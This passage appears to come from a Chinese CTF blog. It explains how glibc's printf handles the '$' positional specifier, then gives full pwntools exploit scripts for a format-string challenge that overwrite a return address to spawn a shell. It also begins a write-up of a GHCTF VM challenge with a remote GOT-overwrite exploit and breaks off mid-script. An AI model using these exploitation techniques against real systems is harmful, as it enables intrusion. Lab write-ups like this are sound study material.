“$”符</h3><p>没有”$”符，程序就会在这里跳来跳起，完成全部解析<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811180756048.png\"></p>\n<p>我们来表中是什么<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811181243402.png\" alt=\"image.png\"></p>\n<p>关于LABEL (form_number)的源码在上文中有，这里不再赘述。它的功能就顺序往参数里写数据，并且是实时的。</p>\n<p>关于LABEL(unknown)的源码上文也有，功能也就是检测当前字符是否为终止符，是则结束，不是则继续。</p>\n<h3 id=\"有”-”-符\"><a href=\"#有”-”-符\" class=\"headerlink\" title=\"有”$” 符\"></a>有”$” 符</h3><p>在vfprintf的do循环中会获取当前字符，并进行一次跳表的寻找找到对应字符的操作函数，跳转执行。<br>如果遇到<code>$</code>符，或者遇到<code>unknown</code>的字符，就会调用<code>printf_positional</code>,去做复杂的字符串的解析</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">printf_arg</span> *<span class=\"title\">args_value</span>;</span></span><br><span class=\"line\"> <span class=\"type\">int</span> *args_size;</span><br><span class=\"line\"> <span class=\"type\">int</span> *args_type;</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"comment\">/* Calculate total size needed to represent a single argument</span></span><br><span class=\"line\"><span class=\"comment\">      across all three argument-related arrays.  */</span></span><br><span class=\"line\">   <span class=\"type\">size_t</span> bytes_per_arg</span><br><span class=\"line\">     = <span class=\"keyword\">sizeof</span> (*args_value) + <span class=\"keyword\">sizeof</span> (*args_size) + <span class=\"keyword\">sizeof</span> (*args_type);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!scratch_buffer_set_array_size (&amp;argsbuf, nargs, bytes_per_arg))</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">done = <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   args_value = argsbuf.data;</span><br><span class=\"line\">   <span class=\"comment\">/* Set up the remaining two arrays to each point past the end of</span></span><br><span class=\"line\"><span class=\"comment\">      the prior array, since space for all three has been allocated</span></span><br><span class=\"line\"><span class=\"comment\">      now.  */</span></span><br><span class=\"line\">   args_size = &amp;args_value[nargs].pa_int;</span><br><span class=\"line\">   args_type = &amp;args_size[nargs];</span><br><span class=\"line\">   <span class=\"built_in\">memset</span> (args_type, (mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span> ? <span class=\"string\">&#x27;\\xff&#x27;</span> : <span class=\"string\">&#x27;\\0&#x27;</span>,</span><br><span class=\"line\">    nargs * <span class=\"keyword\">sizeof</span> (*args_type));</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/* XXX Could do sanity check here: If any element in ARGS_TYPE is</span></span><br><span class=\"line\"><span class=\"comment\">    still zero after this loop, format is invalid.  For now we</span></span><br><span class=\"line\"><span class=\"comment\">    simply use 0 as the value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/* Fill in the types of all the arguments.  */</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (cnt = <span class=\"number\">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"comment\">/* If the width is determined by an argument this is an int.  */</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> (specs[cnt].width_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> (specs[cnt].prec_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">switch</span> (specs[cnt].ndata_args)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">0</span>:\t\t<span class=\"comment\">/* No arguments.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">1</span>:\t\t<span class=\"comment\">/* One argument; we already have the</span></span><br><span class=\"line\"><span class=\"comment\">\t\t   type and size.  */</span></span><br><span class=\"line\">  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class=\"line\">  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class=\"line\">  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">  <span class=\"comment\">/* We have more than one argument for this format spec.</span></span><br><span class=\"line\"><span class=\"comment\">     We must call the arginfo function again to determine</span></span><br><span class=\"line\"><span class=\"comment\">     all the types.  */</span></span><br><span class=\"line\">  (<span class=\"type\">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class=\"line\">    (&amp;specs[cnt].info,</span><br><span class=\"line\">     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class=\"line\">     &amp;args_size[specs[cnt].data_arg]);</span><br><span class=\"line\">  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>在这段代码中，<code>printf_positional</code> 把相关的参数 保存成了副本。后续对格式化字符串的参数处理，都是通过副本做处理。<br>所以说，以第一个<code>$</code>符或者<code>unknown</code>的字符为界，前面通过<code>vfprintf_internal</code> 解析处理，后面通过<code>printf_positional</code>处理。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>如果我们想一次格式化字符串去栈上做任意地址写，需要利用这个特性。假设我们有一个非栈上格式化字符串的机会，栈上存在如下数据：<br>$$<br>\\begin{flalign*}<br>A &amp;&#x3D;&gt; B &#x3D;&gt; C &amp; \\\\<br>B &amp;&#x3D;&gt; C &amp; \\\\<br>&amp;\\ldots &amp; \\\\<br>D &amp;&#x3D;&gt; E &amp;<br>\\end{flalign*}<br>$$<br>如果我们需要修改<code>D</code>的值为<code>F</code>, 那么我们必须先把<code>B</code> 的值改<code>D</code>，然后在通过B这个偏移去修改。 假设A 的偏移为8，<br>这部分<code>fmt</code> 就是 :</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">b&quot;%p&quot;</span>*<span class=\"number\">6</span></span><br><span class=\"line\">payload1 += <span class=\"string\">&quot;%&#123;&#125;c%hn&quot;</span>.<span class=\"built_in\">format</span>(D_low-<span class=\"number\">60</span>).encode()</span><br><span class=\"line\">payload1 += <span class=\"string\">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class=\"built_in\">format</span>(E_low-D_low+<span class=\"number\">60</span>).encode()</span><br><span class=\"line\"><span class=\"comment\"># 如果用$符写，当然不能这么用，因为会使第二次写入失败</span></span><br><span class=\"line\"><span class=\"comment\"># 以下是反面教材，属于想得很美</span></span><br><span class=\"line\">payload2 = <span class=\"string\">&quot;%&#123;&#125;c%8$hn&quot;</span>.<span class=\"built_in\">format</span>(D_low).encode()</span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class=\"built_in\">format</span>(E_low-D_low).encode()</span><br></pre></td></tr></table></figure>\n\n<p>根据上文的介绍，我们不难理解，printf 在处理这些字符串其实是按顺序来的。第一个<code>%n</code>两个payload都是可以修改成功的，但是第二个<code>%n</code> payload2 是 写不上的。或者说它其实是往<code>C</code>中写了数据。<br>因为<code>$</code>符，让payload2 在第一个<code>%n</code>处就已经把所有的参数都固定了，修改后，栈上是变量，但是后续的写入，不会同步这个变化。而payload1是在第二个 <code>%n</code> 才固定参数，这个时候，第9个参数已经变了，所以可以写成功。</p>\n<h1 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。<br><a href=\"https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4\">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a><br>开始研究</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数\"><a href=\"#main函数\" class=\"headerlink\" title=\"main函数\"></a>main函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png\" alt=\"main函数\"></p>\n<p>功能非常的简单，</p>\n<ol>\n<li>循环3次调用talk，需要控制flag的值（后续再看）</li>\n<li>atk判断，成功则调用he()</li>\n</ol>\n<p>先看he()里有啥。</p>\n<h3 id=\"he函数\"><a href=\"#he函数\" class=\"headerlink\" title=\"he函数\"></a>he函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png\" alt=\"he函数\"></p>\n<p>这里建议看汇编，</p>\n<ol>\n<li>system的出现，让人思路开朗</li>\n<li>command是<code>-0xe</code>，也就是要控制<code>rbp-0xe</code></li>\n<li>注意lea 和 mov 的区别，通过这个方法的话，必须要把”&#x2F;bin&#x2F;sh”写在栈上</li>\n</ol>\n<p>一般揣测一下出题人的想法，肯定是最后要返回到这里了。</p>\n<h3 id=\"talk函数\"><a href=\"#talk函数\" class=\"headerlink\" title=\"talk函数\"></a>talk函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png\" alt=\"talk\"></p>\n<p>重点来了，</p>\n<ol>\n<li>非栈上格式化字符串,每次只读0x20字节</li>\n<li>flag初始是0,talk会把它变成1,想办法置0</li>\n<li>返回到了my_read,继续追踪</li>\n</ol>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png\" alt=\"my_read\"></p>\n<p>看看bss段上,这些变量的位置</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png\" alt=\"bss\"></p>\n<p>atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell<br>2.但是，常规的思路，需要的格式化次数不止3次。</p>\n<blockquote>\n<ol>\n<li>%p泄露栈地址</li>\n<li>把rbp链入（因为此题目栈上无<code>诸葛连弩</code>，要自己建）</li>\n<li>修改啥也不行，没次数了</li>\n</ol>\n</blockquote>\n<p>3.所以笔者在这里用了一些奇怪的方法。</p>\n<blockquote>\n<ol>\n<li>笔者开始想，因为<code>i</code>也是在栈上的，所以我可以修改<code>i</code>来增加次数</li>\n<li>但是，恰因如此，如果修改rbp，那么会影响下次循环对<code>i</code>的判断，</li>\n<li>于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。</li>\n<li>所以在笔者的精心的构造下，完成了10次格式化字符串的修改。</li>\n<li>比较重要的就是两个$n的运用。一个把<code>sh</code>写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.</li>\n</ol>\n</blockquote>\n<p>4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"10次格式化字符串\"><a href=\"#10次格式化字符串\" class=\"headerlink\" title=\"10次格式化字符串\"></a>10次格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2，3 rbp链入,修改rbp </span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#4,5,6 &#x27;sh&#x27;写入栈,修改rbp,把rbp+0x3e-4 链入并置0</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%8$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x6873</span>).encode() <span class=\"comment\"># 1 canshuxieshangl</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x58</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>-<span class=\"number\">4</span>-<span class=\"number\">0x58</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode() <span class=\"comment\"># 0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"number\">5</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x00</span>).<span class=\"built_in\">format</span>() <span class=\"comment\"># 1</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">######7 把rbp再次链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#####8 修改rbp 为rbp_low+0x38+0xe</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>).encode()</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 9 把rbp+8 链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">8</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 10 修改返回地址</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x1274</span>).encode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(payload))</span><br><span class=\"line\">payload +=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"优雅至极\"><a href=\"#优雅至极\" class=\"headerlink\" title=\"优雅至极\"></a>优雅至极</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2 gouzao </span></span><br><span class=\"line\">payload =  <span class=\"string\">b&quot;%p&quot;</span> * <span class=\"number\">4</span> </span><br><span class=\"line\">payload += <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x20</span>-<span class=\"number\">0x4</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x6873</span>-(rbp_low+<span class=\"number\">0x20</span>)+<span class=\"number\">0xe</span>)).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3 </span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;%p&quot;</span> *<span class=\"number\">4</span> </span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x12</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x1274</span>-(rbp_low+<span class=\"number\">0x38</span>)+<span class=\"number\">0x30</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n"},{"title":"GHCTF-2025-pwn","cover":"/img/治不开心药.png","_content":"# GHCTF my_vm\n\n## ida分析\n\n### main函数分析\n1.存在backdoor()函数，点开发现system(\"/bin/sh\\x00\").可以直接利用这个地址0x400877.\n2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了\n3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。\n\n### execute函数分析\n\n1.首先看，对op的处理，和对op的限制\n2.寻找漏洞。option == 0x90 时，可以对memory上的数据作修改\n3.基于此，如果`reg[dest]`设置为负数，那么可以完成对其他数据的修改\n4.从第三张图，查看option == 0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在`reg[]`中写入负数，完成数组的向上越界\n\n## 构造思路\n1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行\n2.接着读入op。我们需要对op作一点处理，便于控制每一个字节\n\n```python\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n```\n通过样的处理，我们可以控制每个字节，便于准确的控制\n3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法\n4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以`rax*4` 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到\n5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor\n6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.\n\n## exp \n\n### 修改puts_got\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nbackdoor=0x400877 # 